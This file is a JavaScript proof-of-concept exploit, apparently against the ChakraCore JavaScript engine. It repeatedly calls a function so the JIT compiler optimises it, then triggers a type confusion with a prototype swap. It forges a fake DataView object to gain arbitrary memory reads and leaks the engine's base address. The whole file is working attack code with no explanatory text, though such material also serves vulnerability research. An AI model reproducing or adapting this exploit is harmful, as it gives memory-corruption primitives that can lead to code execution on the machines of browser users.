var fake_object = new Array(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
var f64 = new Float64Array(1);
var i32 = new Int32Array(f64.buffer);
var array_addr_hi, array_addr_lo;
var dv;

function SignedDwordToUnsignedDword(sd)
{
    return (sd < 0) ? sd + 0x100000000 : sd;
}

function opt(arr, proto, arr2) {
    arr[0] = 1.1;
    let tmp = {__proto__: proto};
    arr2[1] = fake_object; // 2.3023e-320;
    addr = arr[1];

    f64[0] = addr;
    var base_lo = i32[0];
    var base_hi = i32[1];

    i32[0] = base_lo + 0x58;
    arr[0] = f64[0];

    // Type*
    fake_object[2] = base_lo + 0x68;         fake_object[3] = base_hi;
    // (TypeId for fake Type object)
    fake_object[4] = 56;                     fake_object[5] = 0;
    // (JavascriptLibrary* for fake Type object, +0x430 must be valid memory)
    fake_object[6] = base_lo + 0x58 - 0x430; fake_object[7] = base_hi;
    // Buffer size
    fake_object[8] = 0x200;                  fake_object[9] = 0;
    // ArrayBuffer pointer, +0x3C IsDetached
    fake_object[10] = base_lo + 0x58 - 0x20 + 20; fake_object[11] = base_hi;
    // Buffer address
    fake_object[14] = base_lo + 0x58;        fake_object[15] = base_hi;
    array_addr_hi = base_hi;
    array_addr_lo = base_lo;

}

function u32_to_i32(x) {
    if (x >= 0x80000000) {
        return -(0x100000000 - x);
    }
    return x;
}

// Int32 to Uint32
function i32_to_u32(x) {
    if (x < 0) {
        return 0x100000000 + x;
    }
    return x;
}


function read32(addr_hi, addr_lo) {
    fake_object[14] = u32_to_i32(addr_lo);
    fake_object[15] = u32_to_i32(addr_hi);
    return DataView.prototype.getInt32.call(dv, 0, true);
}

function read64(addr_hi, addr_low) {
    lower_dword  = read32(addr_hi, addr_low);
    higher_dword = read32(addr_hi, addr_low + 4);
    return {hi : higher_dword, lo : lower_dword };
}   

function main() {
    let arr = [1.1, 2.2, 3.3];
    let arr2 = [1.2, 2.3, 3.4];
    for (let i = 0; i < 10000; i++) {
        opt(arr, {}, arr2);
    }

    opt(arr, arr, arr);
    
    value = SignedDwordToUnsignedDword(array_addr_lo);
    value += SignedDwordToUnsignedDword(array_addr_hi) * 0x100000000;
    print(value.toString(16));

    value = SignedDwordToUnsignedDword(array_addr_lo+0x58);
    value += SignedDwordToUnsignedDword(array_addr_hi) * 0x100000000;
    print(value.toString(16));


    dv = arr[0];
    

    var chakra_leak = read64(array_addr_hi, array_addr_lo);
    

    value = SignedDwordToUnsignedDword(chakra_leak.lo);
    value += SignedDwordToUnsignedDword(chakra_leak.hi) * 0x100000000;
    print(value.toString(16));
    var chakra_base = value-0x000000000535450
    print(chakra_base.toString(16));

    Math.sin(1);
}

main();